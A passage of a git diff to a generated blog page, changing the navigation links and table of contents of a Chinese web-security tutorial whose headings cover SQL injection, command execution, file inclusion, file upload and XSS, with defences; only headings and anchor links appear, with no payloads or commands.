-    <a href="/2022/07/01/Windows%E5%92%8CLinux%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Windows和Linux命令行常用命令</div>
-      <i class="icon-circle-right"></i>
+    <a href="/2022/07/01/PHP%E5%AD%A6%E4%B9%A0/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          PHP学习
+        
+      </div>
     </a>
+  
   
 </nav>
 
@@ -2148,7 +2183,7 @@ http://10.211.55.2/lesson/unser/demo/5.php
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">1.1 SQL注入原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">sql注入漏洞原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">判断数据库类型：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-SQL%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">1.2 SQL注入利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">万能密码：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%9A"><span class="toc-number">2.2.</span> <span class="toc-text">SQL注入类型：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">2.3.</span> <span class="toc-text">联合注入：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">2.4.</span> <span class="toc-text">报错注入：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8%EF%BC%9A"><span class="toc-number">2.5.</span> <span class="toc-text">盲注：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">2.6.</span> <span class="toc-text">二次注入：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">2.7.</span> <span class="toc-text">堆叠注入：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A2%9E%E5%88%A0%E6%94%B9%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">2.8.</span> <span class="toc-text">增删改注入：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#order-by%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">2.9.</span> <span class="toc-text">order by注入：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#limit%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">2.10.</span> <span class="toc-text">limit注入：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-Sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">1.3 Sqlmap的使用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Sqlmap%E4%BB%8B%E7%BB%8D"><span class="toc-number">3.1.</span> <span class="toc-text">Sqlmap介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#get%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">3.2.</span> <span class="toc-text">get注入：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#post%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">3.3.</span> <span class="toc-text">post注入：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%8E%E6%96%87%E4%BB%B6%E4%B8%AD%E8%8E%B7%E5%8F%96request%EF%BC%9A"><span class="toc-number">3.4.</span> <span class="toc-text">从文件中获取request：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sqlmap%E8%8E%B7%E5%8F%96webshell%EF%BC%9A"><span class="toc-number">3.5.</span> <span class="toc-text">sqlmap获取webshell：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sqlmap%E5%85%B6%E4%BB%96%E5%8F%82%E6%95%B0%EF%BC%9A"><span class="toc-number">3.6.</span> <span class="toc-text">sqlmap其他参数：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cookie%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">3.7.</span> <span class="toc-text">cookie注入：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-4-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="toc-number">4.</span> <span class="toc-text">1.4 SQL注入绕过与防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-number">4.1.</span> <span class="toc-text">SQL注入绕过：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1%EF%BC%9A"><span class="toc-number">4.2.</span> <span class="toc-text">SQL注入防御：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number"></span> <span class="toc-text">二、命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">2.1 代码执行原理：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">代码执行原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">代码执行函数：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">2.2 命令执行原理：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">命令执行原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">2.2.</span> <span class="toc-text">命令执行函数：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-Linux%E5%91%BD%E4%BB%A4%E5%8F%8A%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">2.3 Linux命令及绕过：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux%E5%9F%BA%E7%A1%80%EF%BC%9A"><span class="toc-number">3.1.</span> <span class="toc-text">Linux基础：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-number">3.2.</span> <span class="toc-text">Linux命令绕过：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%98%B2%E5%BE%A1"><span class="toc-number">4.</span> <span class="toc-text">2.4 命令执行防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%98%B2%E5%BE%A1%EF%BC%9A"><span class="toc-number">4.1.</span> <span class="toc-text">命令执行防御：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-5-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CCVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">5.</span> <span class="toc-text">2.5 命令执行CVE漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9A"><span class="toc-number">5.1.</span> <span class="toc-text">CVE漏洞复现：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number"></span> <span class="toc-text">三、文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-%E5%88%A0%E9%99%A4"><span class="toc-number">1.</span> <span class="toc-text">3.1 任意文件读取&#x2F;删除</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞描述：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">产生原因：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">文件读取函数：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E4%B8%8E%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">绝对路径与相对路径：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E4%BD%8D%E7%BD%AE%EF%BC%9A"><span class="toc-number">1.5.</span> <span class="toc-text">漏洞产生位置：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="toc-number">1.6.</span> <span class="toc-text">利用方式：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-number">1.7.</span> <span class="toc-text">Linux系统配置文件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-number">1.8.</span> <span class="toc-text">Windows系统配置文件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Apache%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-number">1.9.</span> <span class="toc-text">Apache日志文件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Nginx%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-number">1.10.</span> <span class="toc-text">Nginx日志文件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Mysql%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-number">1.11.</span> <span class="toc-text">Mysql日志文件：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">3.2 文件包含原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0%EF%BC%9A-1"><span class="toc-number">2.1.</span> <span class="toc-text">漏洞描述：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0%EF%BC%9A-1"><span class="toc-number">2.2.</span> <span class="toc-text">产生原因：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">2.3.</span> <span class="toc-text">文件包含函数：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">3.3 文件包含利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABLFI%EF%BC%9A"><span class="toc-number">3.1.</span> <span class="toc-text">本地文件包含LFI：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="toc-number">3.2.</span> <span class="toc-text">本地文件包含利用：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="toc-number">3.3.</span> <span class="toc-text">远程文件包含利用：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">4.</span> <span class="toc-text">3.4 PHP伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%9A"><span class="toc-number">4.1.</span> <span class="toc-text">PHP伪协议：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">4.2.</span> <span class="toc-text">PHP伪协议代码执行:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%98%B2%E5%BE%A1"><span class="toc-number">5.</span> <span class="toc-text">3.5 文件包含防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1%EF%BC%9A"><span class="toc-number">5.1.</span> <span class="toc-text">漏洞防御：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number"></span> <span class="toc-text">四、文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">4.1 文件上传原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">文件上传原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E9%97%A8-webshell"><span class="toc-number">1.2.</span> <span class="toc-text">后门 webshell:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">利用条件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#multipart-form-data%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">multipart&#x2F;form-data：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%9A"><span class="toc-number">1.5.</span> <span class="toc-text">PHP文件上传：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%A3%80%E6%B5%8B"><span class="toc-number">2.</span> <span class="toc-text">4.2 文件上传检测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%A3%80%E6%B5%8B%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">文件上传检测：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">4.3 文件上传绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-number">3.1.</span> <span class="toc-text">客户端验证绕过：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-number">3.2.</span> <span class="toc-text">服务端验证绕过：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%98%B2%E5%BE%A1"><span class="toc-number">4.</span> <span class="toc-text">4.4 文件上传防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E9%98%B2%E5%BE%A1%EF%BC%9A"><span class="toc-number">4.1.</span> <span class="toc-text">服务端防御：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81XXS"><span class="toc-number"></span> <span class="toc-text">五、XXS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-XXS%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">5.1 XXS原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS%E6%A6%82%E8%BF%B0%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">XSS概述：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6%EF%BC%9A-1"><span class="toc-number">1.2.</span> <span class="toc-text">利用条件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9A-1"><span class="toc-number">1.3.</span> <span class="toc-text">利用方式：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS%E7%B1%BB%E5%9E%8B%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">XSS类型：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cookie%EF%BC%9A"><span class="toc-number">1.5.</span> <span class="toc-text">Cookie：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Session%EF%BC%9A"><span class="toc-number">1.6.</span> <span class="toc-text">Session：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82"><span class="toc-number">2.</span> <span class="toc-text">5.2 跨域请求</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">同源策略：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B7%A8%E5%9F%9F%E8%AE%BF%E9%97%AE%EF%BC%9A"><span class="toc-number">2.2.</span> <span class="toc-text">跨域访问：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-4-XSS%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">5.4 XSS绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-number">3.1.</span> <span class="toc-text">XSS绕过：</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">一、SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">1.1 SQL注入原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">1.1.1.</span> <span class="toc-text">sql注入漏洞原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B%EF%BC%9A"><span class="toc-number">1.1.2.</span> <span class="toc-text">判断数据库类型：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-SQL%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">1.2 SQL注入利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%EF%BC%9A"><span class="toc-number">1.2.1.</span> <span class="toc-text">万能密码：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%EF%BC%9A"><span class="toc-number">1.2.2.</span> <span class="toc-text">SQL注入类型：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">1.2.3.</span> <span class="toc-text">联合注入：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">1.2.4.</span> <span class="toc-text">报错注入：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8%EF%BC%9A"><span class="toc-number">1.2.5.</span> <span class="toc-text">盲注：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">1.2.6.</span> <span class="toc-text">二次注入：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">1.2.7.</span> <span class="toc-text">堆叠注入：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A2%9E%E5%88%A0%E6%94%B9%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">1.2.8.</span> <span class="toc-text">增删改注入：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#order-by%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">1.2.9.</span> <span class="toc-text">order by注入：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#limit%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">1.2.10.</span> <span class="toc-text">limit注入：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-Sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">1.3 Sqlmap的使用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Sqlmap%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.3.1.</span> <span class="toc-text">Sqlmap介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#get%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">1.3.2.</span> <span class="toc-text">get注入：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#post%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">1.3.3.</span> <span class="toc-text">post注入：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%8E%E6%96%87%E4%BB%B6%E4%B8%AD%E8%8E%B7%E5%8F%96request%EF%BC%9A"><span class="toc-number">1.3.4.</span> <span class="toc-text">从文件中获取request：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sqlmap%E8%8E%B7%E5%8F%96webshell%EF%BC%9A"><span class="toc-number">1.3.5.</span> <span class="toc-text">sqlmap获取webshell：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sqlmap%E5%85%B6%E4%BB%96%E5%8F%82%E6%95%B0%EF%BC%9A"><span class="toc-number">1.3.6.</span> <span class="toc-text">sqlmap其他参数：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cookie%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">1.3.7.</span> <span class="toc-text">cookie注入：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-4-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="toc-number">1.4.</span> <span class="toc-text">1.4 SQL注入绕过与防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-number">1.4.1.</span> <span class="toc-text">SQL注入绕过：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1%EF%BC%9A"><span class="toc-number">1.4.2.</span> <span class="toc-text">SQL注入防御：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-5-SQL%E6%B3%A8%E5%85%A5%E5%86%99%E5%85%A5webshell%E7%9A%84%E6%9D%A1%E4%BB%B6%E5%92%8C%E6%96%B9%E6%B3%95"><span class="toc-number">1.5.</span> <span class="toc-text">1.5 SQL注入写入webshell的条件和方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%EF%BC%9A"><span class="toc-number">1.5.1.</span> <span class="toc-text">条件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5%EF%BC%9A"><span class="toc-number">1.5.2.</span> <span class="toc-text">写入：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.</span> <span class="toc-text">二、命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 代码执行原理：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">2.1.1.</span> <span class="toc-text">代码执行原理：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">2.1.2.</span> <span class="toc-text">代码执行函数：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" 